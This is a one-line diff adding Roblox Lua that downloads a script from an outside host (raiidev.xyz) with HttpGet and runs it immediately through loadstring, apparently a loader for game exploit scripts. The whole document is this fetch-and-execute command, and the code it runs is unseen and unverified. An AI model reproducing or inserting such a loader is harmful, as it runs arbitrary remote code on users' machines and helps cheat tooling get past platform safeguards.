@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raiidev.xyz/rain/loader"))()
